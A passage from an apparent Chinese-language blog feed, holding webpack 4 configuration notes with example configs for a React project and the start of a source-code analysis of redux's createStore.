'./src/components/button'</span></span><br><span class="line">            components: <span class="string">'./src/components/'</span>,</span><br><span class="line">            <span class="comment">// 只命中以react结尾的</span></span><br><span class="line">            react$: <span class="string">'/path/to/react.min.js'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 在提供的lib中，优先采用es6代码</span></span><br><span class="line">        mainFields: [<span class="string">'jsnext:main'</span>, <span class="string">'browser'</span>, <span class="string">'main'</span>],</span><br><span class="line">        <span class="comment">// 在导入时不带后缀的情况下，优先访问的文件后缀</span></span><br><span class="line">        extensions: [<span class="string">'.ts'</span>, <span class="string">'.js'</span>, <span class="string">'.json'</span>],</span><br><span class="line">        <span class="comment">// 去哪些目录寻找模块，默认是node_modules</span></span><br><span class="line">        modules: [<span class="string">'./src/components'</span>, <span class="string">'node_modules'</span>],</span><br><span class="line">        <span class="comment">// 描述第三方模块的文件，默认package.json</span></span><br><span class="line">        descriptionFiles: [<span class="string">'package.json'</span>],</span><br><span class="line">        <span class="comment">// 强制所有导入语句带后缀，默认false</span></span><br><span class="line">        enforceExtension: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 对node_modules中的模块不带后缀</span></span><br><span class="line">        enforceModuleExtension: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h3><p>每个 plugin 的配置都不同，其用于对整体流程进行操作。</p>
<p><a href="https://webpack.js.org/plugins/" target="_blank" rel="external">官方 plugins 介绍</a></p>
<p>extract-text-webpack-plugin 不能用于 webpack4, 应使用 mini-css-extract-plugin 对 CSS 进行处理。</p>
<p>例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    <span class="keyword">new</span> CleanWebpackPlugin([<span class="string">'dist'</span>]),</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">        template: path.resolve(__dirname, <span class="string">'index.html'</span>),</span><br><span class="line">        filename: <span class="string">'index.html'</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">        filename: <span class="string">'[name].[chunkhash:8].css'</span>,</span><br><span class="line">        chunkFilename: <span class="string">'[id].css'</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">        <span class="string">'process.env.NODE_ENV'</span>: <span class="built_in">JSON</span>.stringify(<span class="string">'production'</span>)</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> webpack.HashedModuleIdsPlugin()</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="optimization"><a href="#optimization" class="headerlink" title="optimization"></a>optimization</h3><p><a href="https://webpack.js.org/configuration/optimization/" target="_blank" rel="external">optimization</a> 是 webpack4 新增的配置项，用于做一些优化配置，此前版本的多个 plugin 都合并在这个配置项中。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    optimization: &#123;</span><br><span class="line">        <span class="comment">// 当mode为production时，此项默认为true，会调用UglifyjsWebpackPlugin对结果进行压缩</span></span><br><span class="line">        minimize: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// minimizer覆盖默认的压缩plugin</span></span><br><span class="line">        minimizer: [<span class="keyword">new</span> UglifyJsPlugin(&#123; sourceMap: <span class="literal">true</span> &#125;)],</span><br><span class="line"></span><br><span class="line">        <span class="comment">// splitChunks代替之前的SplitChunksPlugin，对代码进行分割</span></span><br><span class="line">        splitChunks: &#123;</span><br><span class="line">            cacheGroups: &#123;</span><br><span class="line">                commons: &#123;</span><br><span class="line">                    test: <span class="regexp">/[\\/]node_modules[\\/]/</span>,</span><br><span class="line">                    name: <span class="string">'vendors'</span>,</span><br><span class="line">                    chunks: <span class="string">'all'</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 编译发生错误时不会停止</span></span><br><span class="line">        noEmitOnErrors: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 设置为true可以显示原始模块标识符，便于调试。mode为development时为true，production为false</span></span><br><span class="line">        namedModules: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 使用DefinePlugin设置process.env.NODE_ENV，默认是mode对应的值，如果未设置mode则为production</span></span><br><span class="line">        nodeEnv: <span class="string">'production'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还有一些优化配置会随 mode 自动做改变，以在 production 时做到最优。</p>
<h3 id="performance"><a href="#performance" class="headerlink" title="performance"></a>performance</h3><p><a href="https://webpack.js.org/configuration/performance/" target="_blank" rel="external">performance</a> 用于控制文件大小，此处指的控制是指在超过指定大小时进行警告或报错提示。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    performance: &#123;</span><br><span class="line">        <span class="comment">// 在单个文件大于250k时提示error还是warning，默认是false，即warning提示</span></span><br><span class="line">        <span class="comment">// 也可以直接指定字符串'error'|'warning'</span></span><br><span class="line">        hints: <span class="literal">false</span>,</span><br><span class="line">        <span class="comment">// 首次加载最大大小，超过会报警，单位byte，默认250000</span></span><br><span class="line">        maxEntrypointSize: <span class="number">250000</span>,</span><br><span class="line">        <span class="comment">// 单个文件最大大小，超过会报警，单位byte，默认250000</span></span><br><span class="line">        maxAssetSize: <span class="number">100000</span>,</span><br><span class="line">        <span class="comment">// 指定哪些文件会用于计算性能，这里是js文件</span></span><br><span class="line">        assetFilter: <span class="function"><span class="keyword">function</span>(<span class="params">assetFilename</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> assetFilename.endsWith(<span class="string">'.js'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="DevServer"><a href="#DevServer" class="headerlink" title="DevServer"></a>DevServer</h3><p><a href="https://webpack.js.org/configuration/dev-server/" target="_blank" rel="external">官方 DevServer 介绍</a><br>只会对启动 webpack-dev-server 起作用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    devServer: &#123;</span><br><span class="line">        <span class="comment">// 模块热替换</span></span><br><span class="line">        hot: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 自动刷新，实时预览，默认为true</span></span><br><span class="line">        <span class="comment">// 如果关闭的话，需要访问http://localhost:8080/webpack-dev-server/实时预览</span></span><br><span class="line">        inline: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 用于单页应用，任何请求均返回index.html</span></span><br><span class="line">        historyApiFallback: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 配置由多个单页组成的应用</span></span><br><span class="line">        historyApiFallback: &#123;</span><br><span class="line">            <span class="comment">// 使用正则匹配命中路由</span></span><br><span class="line">            rewrites: [</span><br><span class="line">                <span class="comment">// /user 开头的都返回 user.html</span></span><br><span class="line">                &#123; <span class="keyword">from</span>: <span class="regexp">/^\/user/</span>, to: <span class="string">'/user.html'</span> &#125;,</span><br><span class="line">                &#123; <span class="keyword">from</span>: <span class="regexp">/^\/game/</span>, to: <span class="string">'/game.html'</span> &#125;,</span><br><span class="line">                <span class="comment">// 其它的都返回 index.html</span></span><br><span class="line">                &#123; <span class="keyword">from</span>: <span class="regexp">/./</span>, to: <span class="string">'/index.html'</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 配置文件根目录</span></span><br><span class="line">        <span class="comment">// 用来配置暴露本地文件的规则，你可以通过 contentBase:false 来关闭暴露本地文件</span></span><br><span class="line">        contentBase: path.join(__dirname, <span class="string">'public'</span>),</span><br><span class="line">        <span class="comment">// 注入响应头</span></span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">'X-foo'</span>: <span class="string">'bar'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 配置监听地址，默认是127.0.0.1，这样只有本地可以访问，设为0.0.0.0可以被其他机器访问</span></span><br><span class="line">        <span class="comment">// 相当于命令webpack-dev-server --host 0.0.0.0</span></span><br><span class="line">        host: <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        <span class="comment">// 端口</span></span><br><span class="line">        port: <span class="number">8081</span>,</span><br><span class="line">        <span class="comment">// 允许访问的域名</span></span><br><span class="line">        allowedHosts: [<span class="string">'test.com'</span>],</span><br><span class="line">        <span class="comment">// 关闭host检查，这样可以让局域网其他的机器通过IP访问</span></span><br><span class="line">        disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// https配置，会自动生成一份证书</span></span><br><span class="line">        https: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 自己配置证书</span></span><br><span class="line">        https: &#123;</span><br><span class="line">            key: fs.readFileSync(<span class="string">'path/to/server.key'</span>),</span><br><span class="line">            cert: fs.readFileSync(<span class="string">'path/to/server.crt'</span>),</span><br><span class="line">            ca: fs.readFileSync(<span class="string">'path/to/ca.pem'</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 客户端日志等级，可取如下之一的值 none | error | warning | info，默认info</span></span><br><span class="line">        clientLogLevel: <span class="string">'info'</span>,</span><br><span class="line">        <span class="comment">// gzip压缩，默认false</span></span><br><span class="line">        compress: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 第一次启动在构建完成时打开浏览器</span></span><br><span class="line">        open: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 指定上述情况打开的页面</span></span><br><span class="line">        openPage: <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 设置为true不会watch文件的变化，只有重新访问才会编译</span></span><br><span class="line">        lazy: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="从零搭建-react-配置"><a href="#从零搭建-react-配置" class="headerlink" title="从零搭建 react 配置"></a>从零搭建 react 配置</h3><p>为避免某些众所周知的问题，你可以使用 cnpm 代替 npm:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装react模块</span></span><br><span class="line">npm install react react-dom --save</span><br><span class="line"><span class="comment"># 安装babel,如果你想使用更多的es特性，你可以安装stage部分</span></span><br><span class="line">npm install babel-core babel-loader babel-preset-env babel-preset-stage-2 babel-preset-react --save-dev</span><br><span class="line"><span class="comment"># webpack</span></span><br><span class="line">npm install webpack webpack-cli webpack-dev-server webpack-merge --save-dev</span><br><span class="line"><span class="comment"># 用于处理css和img的loader</span></span><br><span class="line">npm install style-loader css-loader node-sass sass-loader file-loader --save-dev</span><br><span class="line"><span class="comment"># webpack plugins</span></span><br><span class="line">npm install clean-webpack-plugin html-webpack-plugin mini-css-extract-plugin uglifyjs-webpack-plugin optimize-css-assets-webpack-plugin --save-dev</span><br></pre></td></tr></table></figure>
<p>.bashrc:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"presets"</span>: [<span class="string">"env"</span>, <span class="string">"stage-2"</span>, <span class="string">"react"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面我们创建三个文件，webpack.common 是一些公共配置，webpack.dev 用于开发环境，会启动 webpack-dev-server，webpack.prod 用于生产环境，会最小化编译代码。</p>
<p>然后通过 webpack –config 指定相关文件，在 package.json 中进行命令配置。</p>
<p>webpack.common.config.js:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">        app: <span class="string">'./src/index.js'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">'dist'</span>),</span><br><span class="line">        filename: <span class="string">'[name].js'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> CleanWebpackPlugin([<span class="string">'dist'</span>]),</span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            template: path.resolve(__dirname, <span class="string">'index.html'</span>),</span><br><span class="line">            filename: <span class="string">'index.html'</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ],</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.(js|jsx)$/</span>,</span><br><span class="line">                exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">                use: &#123;</span><br><span class="line">                    loader: <span class="string">'babel-loader'</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.s?css$/</span>,</span><br><span class="line">                use: [</span><br><span class="line">                    <span class="string">'style-loader'</span>,</span><br><span class="line">                    &#123;</span><br><span class="line">                        loader: <span class="string">'css-loader'</span>,</span><br><span class="line">                        options: &#123;</span><br><span class="line">                            <span class="comment">// 模块化</span></span><br><span class="line">                            modules: <span class="literal">true</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">'sass-loader'</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.(png|jpg|gif|svg)$/</span>,</span><br><span class="line">                use: [<span class="string">'file-loader'</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.(woff|woff2|eot|ttf|otf)$/</span>,</span><br><span class="line">                use: [<span class="string">'file-loader'</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>webpack.dev.config.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"><span class="keyword">const</span> common = <span class="built_in">require</span>(<span class="string">'./webpack.common'</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = merge(common, &#123;</span><br><span class="line">    mode: <span class="string">'development'</span>,</span><br><span class="line">    devtool: <span class="string">'inline-source-map'</span>,</span><br><span class="line">    devServer: &#123;</span><br><span class="line">        contentBase: <span class="string">'./dist'</span>,</span><br><span class="line">        <span class="comment">// 启动模块热重载</span></span><br><span class="line">        hot: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// 可以设置proxy与后端联调</span></span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">'/'</span>: <span class="string">'http://localhost:8083'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [<span class="keyword">new</span> webpack.HotModuleReplacementPlugin()]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>webpack.prod.config.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 省略一些引用</span></span><br><span class="line"><span class="built_in">module</span>.exports = merge(common, &#123;</span><br><span class="line">    mode: <span class="string">'production'</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: <span class="string">'[name].[chunkhash].bundle.js'</span>,</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">            filename: <span class="string">'[name].[chunkhash:8].css'</span>,</span><br><span class="line">            chunkFilename: <span class="string">'[id].css'</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> webpack.HashedModuleIdsPlugin()</span><br><span class="line">    ],</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.s?css$/</span>,</span><br><span class="line">                use: [</span><br><span class="line">                    MiniCssExtractPlugin.loader,</span><br><span class="line">                    &#123;</span><br><span class="line">                        loader: <span class="string">'css-loader'</span>,</span><br><span class="line">                        options: &#123;</span><br><span class="line">                            <span class="comment">// 模块化</span></span><br><span class="line">                            modules: <span class="literal">true</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">'sass-loader'</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    optimization: &#123;</span><br><span class="line">        minimizer: [</span><br><span class="line">            <span class="keyword">new</span> UglifyJsPlugin(&#123;</span><br><span class="line">                sourceMap: <span class="literal">true</span></span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> OptimizeCSSAssetsPlugin(&#123;&#125;)</span><br><span class="line">        ],</span><br><span class="line">        splitChunks: &#123;</span><br><span class="line">            chunks: <span class="string">'all'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;本文基于 webpack4 , 用于查询常用配置，算是学习官方文档过后的一个笔记，如果你想全面了解 webpack 的配置，还请参考&lt;a h
    
    </summary>
    
    
      <category term="frontend" scheme="http://myt0.com/tags/frontend/"/>
    
      <category term="javascript" scheme="http://myt0.com/tags/javascript/"/>
    
      <category term="webpack" scheme="http://myt0.com/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>redux和react-redux原理分析</title>
    <link href="http://myt0.com/2018/07/17/analysis-of-react-redux/"/>
    <id>http://myt0.com/2018/07/17/analysis-of-react-redux/</id>
    <published>2018-07-17T15:00:00.000Z</published>
    <updated>2018-07-17T15:04:27.341Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>redux 和 react-redux 是两个不同的库，redux 的出现是为了解决大型应用中组件状态管理混乱的问题，react-redux 则是便于 redux 结合 react.js 来使用。<br>在阅读本文之前，您需要了解 redux 及 react 的基本用法。<br>本文省略了源码中的一些对理解影响不大的代码，只对核心源码做分析。</p>
<h2 id="redux"><a href="#redux" class="headerlink" title="redux"></a>redux</h2><p>redux 是真正的状态管理者，其通过闭包使状态数据永久地保存在内存当中，通过闭包来改变和获取状态数据。<br>redux 一共导出了五个方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    createStore,</span><br><span class="line">    combineReducers,</span><br><span class="line">    bindActionCreators,</span><br><span class="line">    applyMiddleware,</span><br><span class="line">    compose</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="createStore"><a href="#createStore" class="headerlink" title="createStore"></a>createStore</h3><p>createStore 用来创建一个存储对象，其共有三个参数</p>
<ol>
<li><p>reducer 是 redux 的核心部分，reducer 的作用就是来改变数据的<br>createStore 返回一个我们称之为 store 的对象，调用其 store 的 dispatch 方法会自动调用我们传入的 reducer，用 reducer 的返回值改变 state</p>
</li>
<li><p>preloadedState 是初始化状态</p>
</li>
<li>enhancer 的中文意思是增强器，其实就是一个包装函数</li>
</ol>
<p>以下是其部分源码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createStore</span>(<span class="params">reducer, preloadedState, enhancer</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _ref2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> preloadedState === <span class="string">'function'</span> &amp;&amp; <span class="keyword">typeof</span> enhancer === <span class="string">'undefined'</span>) &#123;</span><br><span class="line">        enhancer = preloadedState;</span><br><span class="line">        preloadedState = <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> enhancer !== <span class="string">'undefined'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> enhancer !== <span class="string">'function'</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Expected the enhancer to be a function.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> enhancer(createStore)(reducer, preloadedState);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将reducer, preloaderState存在局部变量里，同时初始化listeners为一个数组</span></span><br><span class="line">    <span class="keyword">var</span> currentReducer = reducer;</span><br><span class="line">    <span class="keyword">var</span> currentState = preloadedState;</span><br><span class="line">    <span class="keyword">var</span> currentListeners = [];</span><br><span class="line">    <span class="keyword">var</span> nextListeners = currentListeners;</span><br><span class="line">    <span class="comment">// 是否正在调用reducer</span></span><br><span class="line">    <span class="keyword">var</span> isDispatching = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回当前状态</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getState</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> currentState;</span><br><span class="line">    